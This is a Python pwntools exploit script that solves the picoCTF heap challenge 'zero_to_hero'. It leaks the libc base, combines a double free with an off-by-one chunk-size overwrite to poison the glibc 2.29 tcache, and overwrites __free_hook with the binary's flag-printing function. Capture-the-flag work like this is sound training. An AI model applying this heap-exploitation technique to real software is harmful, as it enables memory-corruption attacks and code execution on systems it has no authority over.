#!/usr/bin/env python3

from pwn import *

exe = ELF("./zero_to_hero_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.29.so")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

index = -1


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            script = "b *0x000000000400C2E\nb *0x0000000000400B03\nc" if args.BREAK else "c"
            gdb.attach(r, gdbscript=script)
    else:
        r = remote("jupiter.challenges.picoctf.org", 10089)

    return r

def get_power(r: process, desc_len: int, desc: bytes) -> int:
    global index
    index += 1
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'> ', str(desc_len).encode())
    r.sendlineafter(b'> ', desc)
    return index

def remove_power(r: process, index: int):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'> ', str(index).encode())
    

def main():
    WIN_FUNC = 0x0000000000400A02
    FREE_ADDR = 0x000000000601F70
    
    r = conn()

    """
    pointers are not nulled after freeing so 
    we can free them twice - thus we get a 
    double free attack. 
    glibc 2.29 made double free attacks really difficult
    on tcache bins - as it searches the entire bin 
    for the specific chunk being freed before inserting
    it. therefore well utilize the off by one vuln
    to change the size of a chunk and then free it 
    again. thus placing it in a different bin. and
    getting the desired double free.
    next well use the libc leak we got from the program
    to overwrite __free_hook and make it run the
    print_flag function
    """
    r.sendlineafter(b"So, you want to be a hero?\n", b"yes of course man")
    
    r.recvuntil(b'Take this: ')
    system_leak = int(r.recvline(keepends=False).decode(), 16)
    libc.address = system_leak - libc.sym.system
    
    info('Leaked libc base adress @ ' + hex(libc.address))
    
    first_boy = get_power(r, 0x108, b'')
    second_boy = get_power(r, 0x108, b'')
    remove_power(r,second_boy)
    remove_power(r,first_boy)
    third_boy = get_power(r, 0x108, b'A'*0x108)
    remove_power(r,second_boy)
    fourth_boy = get_power(r,0x108, p64(libc.sym.__free_hook))
    fifth = get_power(r, 0xf0, b'')
    final = get_power(r, 0xf0, p64(WIN_FUNC))    

    remove_power(r, final)
    r.interactive()


if __name__ == "__main__":
    main()
